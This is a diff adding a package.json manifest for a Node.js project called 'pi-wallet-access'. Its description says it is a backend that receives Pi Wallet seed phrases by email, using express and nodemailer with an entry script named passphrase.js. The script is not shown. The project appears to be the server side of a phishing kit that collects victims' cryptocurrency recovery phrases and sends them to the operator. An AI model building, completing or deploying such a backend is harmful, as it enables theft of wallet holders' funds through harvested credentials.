@@ -1,0 +1,16 @@
+{
+  "name": "pi-wallet-access",
+  "version": "1.0.0",
+  "description": "A simple backend to receive Pi Wallet seed phrases via email",
+  "main": "passphrase.js",
+  "scripts": {
+    "dev": "node passphrase.js",
+    "start": "node passphrase.js"
+  },
+  "dependencies": {
+    "express": "^4.18.2",
+    "nodemailer": "^6.9.4"
+  },
+  "author": "Top boy",
+  "license": "ISC"
+}
